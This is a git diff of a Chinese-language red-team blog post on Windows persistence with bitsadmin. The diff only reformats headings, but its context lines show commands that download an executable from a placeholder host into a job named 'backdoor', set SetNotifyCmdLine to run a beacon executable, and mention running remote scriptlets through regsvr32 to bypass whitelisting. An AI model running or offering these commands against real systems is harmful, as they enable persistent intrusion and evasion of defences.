@@ -7,19 +7,18 @@ tags:
   - Bitsadmin
   - Windows
   - Persistence
+slug: English-Preview
 ---
+> Persistence bitsadmin
+<!--more-->
 
-## 0x00 前言
-
-Persistence bitsadmin
-
-## 0x01 bitsadmin
+# bitsadmin
 
 Microsoft 提供了一个名为“ **bitsadmin** ”的二进制文件和 PowerShell cmdlet，用于创建和管理文件传输
 
-### 基础命令
+## 基础命令
 
-#### 显示所有用户的 BITS 任务列表
+### 显示所有用户的 BITS 任务列表
 
 ```cmd
 # 包括活动任务和已完成任务
@@ -35,21 +34,21 @@ bitsadmin /list /allusers /verbose
 bitsadmin /cancel <Job Name>
 ```
 
-## 0x02 下载方式
+### 下载方式
 
-### Cmd
+#### Cmd
 
 ```cmd
 bitsadmin /transfer backdoor /download /priority high http://IP:Port/Filename <path to executable>
 ```
 
-### PowerShell
+#### PowerShell
 
 ```powershell
 Start-BitsTransfer -Source "http://IP:Port/Filename" -Destination "<path to executable>"
 ```
 
-## 0x03 利用方法
+## 利用方法
 
 将文件写入磁盘后，可以通过从“ **bitsadmin** ”实用程序执行以下命令来实现持久化
 
@@ -66,8 +65,7 @@ bitsadmin /SetNotifyCmdLine backdoor C:\tmp\beacon.exe NUL
 bitsadmin /SetMinRetryDelay "backdoor" 60
 bitsadmin /resume backdoor
 ```
-
-### SetNotifyCmdLine
+# SetNotifyCmdLine
 
 **SetNotifyCmdLine** 参数还可用于通过[regsvr32](https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/)实用程序从远程位置执行 scriptlet。这种方法的好处是不接触磁盘，可以绕过白名单
 
